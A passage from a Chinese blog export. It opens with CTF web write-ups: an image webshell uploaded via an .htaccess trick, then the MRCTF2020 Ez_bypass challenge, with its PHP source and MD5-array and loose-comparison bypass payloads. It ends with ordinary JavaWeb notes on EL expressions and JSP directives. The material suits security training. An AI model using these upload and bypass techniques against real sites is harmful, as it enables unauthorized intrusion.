<p>接着上传51nd0re1.jpg的图片马就行<br><img src="/img/Nepnep/你传你马呢1.png" alt="avatar"></p>
<p>由于上传了.htaccess文件，这个图片马就会被正常解析，直接访问提供的地址<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">upload/db3e8839bdd7ac63daec00365c554da2/<span class="number">51</span>nd0re1.jpg</span><br></pre></td></tr></table></figure><br>蚁剑连接得到flag</p>
<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开F12看到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
<p>看第一个if就是考虑md5碰撞<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=QNKCDZO&amp;gg=s878926199a</span><br></pre></td></tr></table></figure><br>但是发现不行，所以使用数组<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?id[]=<span class="number">1</span>&amp;gg[]=<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p>接下来是POST请求，弱类型比较并且要求passwd不能为数字，那就加字符1234567abc，这就变成字符串了</p>
<p><img src="/img/Nepnep/Ez_bypass.png" alt="avatar"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Nepnep</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/8/8-EL表达式</title>
    <url>/2020/08/08/JavaWeb-2020-8-8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h1><ol>
<li><p>EL（Expression Language表达式语言）</p>
</li>
<li><p>作用：替换和简化jsp页面中java代码的编写</p>
</li>
<li><p>语法：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;表达式&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>注意： </p>
<ul>
<li><p>jsp默认支持el表达式，如果要忽略EL表达式</p>
<ol>
<li><p>设置JSP中page指令中isELIgnored=”true”忽略当前JSP页面中所有的EL表达式</p>
</li>
<li><p>${表达式} 忽略当前这个EL表达式</p>
</li>
</ol>
</li>
</ul>
</li>
<li><p>使用：</p>
<ol>
<li><p>运算</p>
<ul>
<li><p>运算符</p>
<ol>
<li><p>算术运算符：+ - * / %</p>
</li>
<li><p>比较运算符：&lt; &gt; &lt;= &gt;= == !=</p>
</li>
<li><p>逻辑运算符： &amp;&amp; || !</p>
</li>
<li><p>空运算符 empty</p>
<ul>
<li><p>功能：用于判断字符串，集合，数组对象是否为null并且长度是否为0</p>
</li>
<li><p>${empty list}</p>
</li>
<li><p>${not empty str}：表示判断字符串，集合，数组对象是否不为null或者长度&gt;0</p>
</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
<li><p>获取值</p>
</li>
</ol>
</li>
</ol>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>算术：<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">$</span><span class="template-variable">&#123;3+4&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">$</span><span class="template-variable">&#123;3/4&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span>  <span class="tag">&lt;<span class="name">%--$</span></span></span><span class="template-variable">&#123;3 div 4&#125;</span><span class="xml"><span class="tag"><span class="attr">--</span>%&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">$</span><span class="template-variable">&#123;3%4&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span>  <span class="tag">&lt;<span class="name">%--$</span></span></span><span class="template-variable">&#123;3 mod 4&#125;</span><span class="xml"><span class="tag"><span class="attr">--</span>%&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/JavaWeb/8-8学习日记/0.png" alt="avatar"></p>
<p>比较：（逻辑类似不演示了）<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="number">3</span>&lt;<span class="number">4</span>&#125;&lt;br&gt;</span><br></pre></td></tr></table></figure><br>返回true</p>
<h3 id="empty运算符"><a href="#empty运算符" class="headerlink" title="empty运算符"></a>empty运算符</h3><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="literal">empty</span>运算符</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="built_in">String</span> str1=<span class="string">"abc"</span>;</span><br><span class="line">    <span class="built_in">String</span> str2=<span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">String</span> str3=<span class="string">""</span>;</span><br><span class="line">    <span class="built_in">request</span>.setAttribute(<span class="string">"str1"</span>,str1);</span><br><span class="line">    <span class="built_in">request</span>.setAttribute(<span class="string">"str2"</span>,str2);</span><br><span class="line">    <span class="built_in">request</span>.setAttribute(<span class="string">"str3"</span>,str3);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">$&#123;<span class="literal">empty</span> str1&#125;&lt;br&gt;</span><br><span class="line">$&#123;<span class="literal">empty</span> str2&#125;&lt;br&gt;</span><br><span class="line">$&#123;<span class="literal">empty</span> str3&#125;&lt;br&gt;</span><br></pre></td></tr></table></figure>
<p>可以判断是否为null或长度是否为零<br><img src="/img/JavaWeb/8-8学习日记/7.png" alt="avatar"></p>
<p>如果要取反操作，那就是not empty</p>
<h2 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h2><ol>
<li><p>EL表达式只能从域对象中获取值</p>
</li>
<li><p>语法：</p>
<ol>
<li><p>${域名称.键名}：从指定域中获取指定键的值</p>
<ul>
<li><p>域名称：</p>
<ol>
<li><p>pageScope —&gt; pageContext</p>
</li>
<li><p>requestScope —&gt; request</p>
</li>
<li><p>sessionScope —&gt; session</p>
</li>
<li><p>applicationScope —&gt; application(ServletContext)</p>
</li>
</ol>
</li>
<li><p>举例：在request域中存储了name-张三</p>
</li>
<li><p>获取：${requestScope.name}</p>
</li>
</ul>
</li>
<li><p>${键名}：表示依次从最小的域中查找是否有该键对应的值，直到找到为止</p>
</li>
</ol>
</li>
</ol>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//在域中存储数据</span></span><br><span class="line">    request.setAttribute(<span class="string">"name"</span>,<span class="string">"zhangsan"</span>);</span><br><span class="line">    session.setAttribute(<span class="string">"age"</span>,<span class="string">"23"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    获取值</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;requestScope</span>.name&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;sessionScope</span>.age&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;sessionScope</span>.name&#125;</span><br></pre></td></tr></table></figure>
<p>如果没有找到对应的值，则会返回空字符串而不是null，这样就不会打乱布局<br><img src="/img/JavaWeb/8-8学习日记/1.png" alt="avatar"></p>
<h3 id="获取对象值"><a href="#获取对象值" class="headerlink" title="获取对象值"></a>获取对象值</h3><ul>
<li>对象：${域名称.键名.属性名}<ul>
<li>本质上调用对象的getter方法</li>
</ul>
</li>
</ul>
<p>User类：<br><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">String</span> name;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">int</span> age;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">Date</span> birthday;</span><br></pre></td></tr></table></figure><br>代码太多，就正常的生成getter和setter就行，这里只列成员变量了</p>
<p>User对象：<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">User</span> <span class="keyword">user</span>=<span class="built_in">new</span> <span class="keyword">User</span>();</span><br><span class="line">    <span class="keyword">user</span>.setName("张三");</span><br><span class="line">    <span class="keyword">user</span>.setAge(<span class="number">23</span>);</span><br><span class="line">    <span class="keyword">user</span>.setBirthday(<span class="built_in">new</span> <span class="type">Date</span>());</span><br><span class="line"></span><br><span class="line">    request.setAttribute("u",<span class="keyword">user</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">el获取对象中的值</span><br><span class="line">$&#123;requestScope.u&#125;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="comment">--</span></span><br><span class="line">通过的是对象的属性来获取</span><br><span class="line">    setter或getter方法，去掉<span class="keyword">set</span>或<span class="keyword">get</span>，在将剩余部分，首字母变小写。</span><br><span class="line">    setName <span class="comment">--&gt; Name --&gt; name</span></span><br><span class="line"><span class="comment">--%&gt;</span></span><br><span class="line"></span><br><span class="line">$&#123;requestScope.u.name&#125;&lt;br&gt;</span><br><span class="line">$&#123;requestScope.u.age&#125;&lt;br&gt;</span><br><span class="line">$&#123;requestScope.u.birthday&#125;&lt;br&gt;</span><br></pre></td></tr></table></figure><br>运行结果<br><img src="/img/JavaWeb/8-8学习日记/2.png" alt="avatar"></p>
<p>保证键名称不相同，可以省略掉requestScope</p>
<p>如果想要只输出日期中的年或者月之类的，直接birthday.year<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">$</span><span class="template-variable">&#123;u.birthday.year&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>这样就会输出年份了，经典套娃</p>
<p>如果想要中文格式的，只需要在类中声明一个方法，格式化对象类，再调用就OK了<br><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function">String <span class="title">getBitStr</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(birthday!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//1.格式化日期对象</span></span><br><span class="line">            SimpleDateFormat sdf=<span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">            <span class="comment">//2.返回字符串</span></span><br><span class="line">            <span class="function"><span class="keyword">return</span> sdf.<span class="title">format</span><span class="params">(birthday)</span></span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>调用：<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">$</span><span class="template-variable">&#123;u.bitStr&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>运行结果<br><img src="/img/JavaWeb/8-8学习日记/3.png" alt="avatar"></p>
<h3 id="获取List值"><a href="#获取List值" class="headerlink" title="获取List值"></a>获取List值</h3><ul>
<li>List集合：${域名称.键名[索引]}</li>
</ul>
<p>设置List:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">List <span class="attribute">list</span>=new ArrayList&lt;&gt;();</span><br><span class="line">list.<span class="builtin-name">add</span>(<span class="string">"aaa"</span>);</span><br><span class="line">list.<span class="builtin-name">add</span>(<span class="string">"bbb"</span>);</span><br></pre></td></tr></table></figure>
<p>获取List:</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">el获取<span class="keyword">List</span>值</span><br><span class="line"><span class="variable">$&#123;list&#125;</span>&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[0]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[1]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[5]&#125;&lt;<span class="keyword">br</span>&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/img/JavaWeb/8-8学习日记/4.png" alt="avatar"></p>
<p>这就是获取List的值，很简单，当下标越界时并不会报错或者输出null，而是输出空字符串，同样这样的优化不会打乱布局</p>
<p>如果添加的是对象<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">List <span class="attribute">list</span>=new ArrayList&lt;&gt;();</span><br><span class="line">list.<span class="builtin-name">add</span>(<span class="string">"aaa"</span>);</span><br><span class="line">list.<span class="builtin-name">add</span>(<span class="string">"bbb"</span>);</span><br><span class="line">list.<span class="builtin-name">add</span>(user);</span><br></pre></td></tr></table></figure><br>获取也很简单<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">el获取<span class="keyword">List</span>值</span><br><span class="line"><span class="variable">$&#123;list&#125;</span>&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[0]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[1]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[5]&#125;&lt;<span class="keyword">br</span>&gt;</span><br><span class="line"><span class="variable">$&#123;list</span>[2].name&#125;&lt;<span class="keyword">br</span>&gt;</span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/8-8学习日记/5.png" alt="avatar"></p>
<h3 id="获取List值-1"><a href="#获取List值-1" class="headerlink" title="获取List值"></a>获取List值</h3><ul>
<li><p>Map集合：</p>
<ul>
<li><p>${域名称.键名.key名称}</p>
</li>
<li><p>${域名称.键名[“key名称”]}</p>
</li>
</ul>
</li>
</ul>
<p>设置Map:<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">Map <span class="built_in">map</span>=<span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"sname"</span>,<span class="string">"李四"</span>);</span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"gender"</span>,<span class="string">"男"</span>);</span><br><span class="line">request.setAttribute(<span class="string">"map"</span>,<span class="built_in">map</span>);</span><br></pre></td></tr></table></figure><br>获取Map:<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;h3&gt;</span><span class="keyword">el</span>获取Map值&lt;/h3&gt;</span><br><span class="line">$&#123;<span class="keyword">map</span>&#125;<span class="symbol">&lt;br&gt;</span></span><br><span class="line">$&#123;<span class="keyword">map</span>.sname&#125;<span class="symbol">&lt;br&gt;</span></span><br><span class="line">$&#123;<span class="keyword">map</span>[<span class="string">"gender"</span>]&#125;<span class="symbol">&lt;br&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/8-8学习日记/6.png" alt="avatar"></p>
<p>很简单</p>
<p>添加对象方法也一样，套娃就完了</p>
<h2 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h2><ul>
<li><p>隐式对象有11个，但是现在只需要掌握pageContext</p>
</li>
<li><p>pageContext：</p>
<ul>
<li>获取JSP其他八个内置对象<ul>
<li>${pageContext.request.contextPath}：动态获取虚拟目录</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">$</span><span class="template-variable">&#123;pageContext.request&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>动态获取虚拟目录<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">$</span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/JavaWeb/8-8学习日记/8.png" alt="avatar"></p>
<p>这个的用途就是在表单action中，把虚拟目录变为动态改变的，而不是写死的静态的</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/8/6-JSP</title>
    <url>/2020/08/06/JavaWeb-2020-8-6-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><p>之前只是简单了解了一下，现在来详细学习一下</p>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><ul>
<li><p>作用：用于配置JSP页面，导入资源文件</p>
</li>
<li><p>格式：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&lt;%@ 指令名称 属性名<span class="number">1</span>=属性值<span class="number">1</span> 属性名<span class="number">2</span>=属性值<span class="number">2</span> %&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>分类：</p>
<ol>
<li><p>page  配置JSP页面</p>
<ul>
<li><p>contentType</p>
</li>
<li><p>import</p>
</li>
<li><p>errorPage</p>
</li>
<li><p>isErrorPage</p>
</li>
</ul>
</li>
<li><p>include  页面包含的。导入页面的资源文件</p>
</li>
<li><p>taglib  导入资源 </p>
<ul>
<li>prefix和uri</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="page指令"><a href="#page指令" class="headerlink" title="page指令"></a>page指令</h3><ul>
<li><p>contentType：等同于response.setContentType()</p>
<ol>
<li><p>设置响应体的mime类型以及字符集</p>
</li>
<li><p>设置当前JSP页面的编码(只能是高级IDE才能生效，低级工具，则需要pageEncoding属性设置当前页面的字符集)</p>
</li>
</ol>
</li>
<li><p>import：导包</p>
</li>
<li><p>errorPage：当前页面发生异常后，会自动跳转到指定的错误页面</p>
</li>
<li><p>isErrorPage：标识当前页面是否是错误页面</p>
</li>
</ul>
<h4 id="import"><a href="#import" class="headerlink" title="import"></a>import</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;%@<span class="built_in"> page </span><span class="attribute">import</span>=<span class="string">"java.util.Date"</span> %&gt;</span><br><span class="line">&lt;%@<span class="built_in"> page </span><span class="attribute">import</span>=<span class="string">"java.text.SimpleDateFormat"</span> %&gt;</span><br><span class="line">&lt;%@<span class="built_in"> page </span><span class="attribute">import</span>=<span class="string">"java.net.URLEncoder"</span> %&gt;</span><br><span class="line">&lt;%@<span class="built_in"> page </span><span class="attribute">import</span>=<span class="string">"java.net.URLDecoder"</span> %&gt;</span><br><span class="line">&lt;%@<span class="built_in"> page </span><span class="attribute">import</span>=<span class="string">"java.util.ArrayList"</span> %&gt;</span><br><span class="line">&lt;%@<span class="built_in"> page </span><span class="attribute">import</span>=<span class="string">"java.util.List"</span> %&gt;</span><br></pre></td></tr></table></figure>
<h4 id="errorPage"><a href="#errorPage" class="headerlink" title="errorPage"></a>errorPage</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="built_in">int</span> i=<span class="number">3</span>/<span class="number">0</span>;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>这样就会在客户端上输出500以及错误信息，但是我们并不希望让用户看到这些，要显示一个友好页面</p>
<p>所以在index中设置<br><figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="perl">@page contentType=<span class="string">"text/html; utf-8"</span> errorPage=<span class="string">"500.jsp"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="perl">    <span class="keyword">int</span> i =<span class="number">3</span>/<span class="number">0</span>;</span></span><br><span class="line"><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>500.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page import=<span class="string">"java.util.List"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page import=<span class="string">"java.util.ArrayList"</span> </span><span class="xml"><span class="tag">%&gt;</span><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">  Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="ruby">  <span class="symbol">User:</span> songf</span></span><br><span class="line"><span class="ruby">  <span class="symbol">Date:</span> <span class="number">2020</span>/<span class="number">8</span>/<span class="number">6</span></span></span><br><span class="line"><span class="ruby">  <span class="symbol">Time:</span> <span class="number">16</span><span class="symbol">:</span><span class="number">00</span></span></span><br><span class="line"><span class="ruby">  To change this template use File <span class="params">| Settings |</span> File Templates.</span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">服务器正忙...</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>接下来访问index.jsp，就会访问到500.jsp的页面<br><img src="/img/JavaWeb/8-6学习日记/0.png" alt="avatar"></p>
<h4 id="isErrorPage"><a href="#isErrorPage" class="headerlink" title="isErrorPage"></a>isErrorPage</h4><p>修改500.jsp<br><figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="perl">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="perl">@page isErrorPage=<span class="string">"true"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>服务器正忙...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="perl">    String message = exception.getMessage();</span></span><br><span class="line"><span class="perl">    out.<span class="keyword">print</span>(message);</span></span><br><span class="line"><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>将isErrorPage设置为true，再配合exception就可以输出错误信息了<br><img src="/img/JavaWeb/8-6学习日记/1.png" alt="avatar"></p>
<h3 id="include指令"><a href="#include指令" class="headerlink" title="include指令"></a>include指令</h3><p>top.jsp<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;%@<span class="built_in"> page </span><span class="attribute">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attribute">language</span>=<span class="string">"java"</span> %&gt;</span><br><span class="line">页面logo页面标题</span><br></pre></td></tr></table></figure><br>home.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@include file=<span class="string">"top.jsp"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">主体信息</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>使用include包含进来，访问home.jsp<br><img src="/img/JavaWeb/8-6学习日记/2.png" alt="avatar"></p>
<p>由于一些问题，所以这里我把标签删掉了</p>
